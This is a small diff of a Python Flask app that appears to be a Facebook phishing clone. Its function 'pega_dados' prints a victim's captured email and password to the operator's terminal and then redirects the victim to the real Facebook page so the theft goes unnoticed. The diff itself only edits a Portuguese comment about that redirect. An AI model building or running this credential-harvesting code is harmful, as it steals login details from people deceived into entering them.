@@ -14,6 +14,6 @@ def pega_dados():
     
     print(f"EMAIL:{email} \n SENHA:{senha}") #imprimir o email e senha no terminal
     
-    return redirect("https://www.facebook.com/?locale=pt_BR") #redirecionar o usuario para a tela inicial após login falhar
+    return redirect("https://www.facebook.com/?locale=pt_BR") #redirecionar o usuario para a tela inicial após login
 
 app.run()
